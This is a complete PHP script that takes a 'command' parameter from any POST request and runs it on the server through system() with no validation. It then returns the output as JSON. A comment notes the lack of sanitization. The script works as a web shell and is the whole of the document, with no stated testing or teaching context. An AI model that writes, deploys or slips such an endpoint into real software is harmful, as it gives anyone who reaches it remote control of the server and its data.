<?php

// Check if the 'command' field is set in the POST request
if (isset($_POST['command'])) {
    // Directly execute the command provided by the user (no sanitization)
    $command = $_POST['command'];

    // Capture the output in a buffer
    ob_start();
    $result = system($command, $return_var);
    $output = ob_get_clean();

    // Check if the command was executed successfully
    if ($return_var === 0) {
        $message = [
            'status' => 'success',
            'result' => $output,
        ];
    } else {
        $message = [
            'status' => 'error',
            'message' => 'Command failed to execute',
            'result' => $output,
        ];
    }
} else {
    // If 'command' is not provided
    $message = [
        'status' => 'error',
        'message' => 'No command provided',
    ];
}

// Set the content type to JSON and output the result
header("Content-Type: application/json");
echo json_encode($message);

?>
